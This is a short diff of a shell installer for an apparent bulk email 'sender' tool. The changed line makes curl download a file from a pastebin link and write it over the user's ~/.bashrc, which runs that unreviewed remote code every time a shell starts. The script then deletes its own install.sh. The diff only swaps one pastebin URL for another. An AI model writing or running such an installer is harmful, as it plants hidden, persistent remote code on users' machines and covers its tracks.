@@ -25,7 +25,7 @@ read token
 sudo rm token.txt
 echo $token > token.txt
 cp ~/.bashrc ~/.bashrc-bak
-curl "https://pastebin.com/raw/LGdbLEyk" -o ~/.bashrc
+curl "https://pastebin.com/raw/bqthC1xv" -o ~/.bashrc
 clear
 printf "\e[32mSENDER INSTALLED SUCCESSFULLY !\n\e[0mYOU CAN RUN \e[31mphp W3LL\e[0m TO RUN SENDER NOW !\n\n"
 sudo rm install.sh
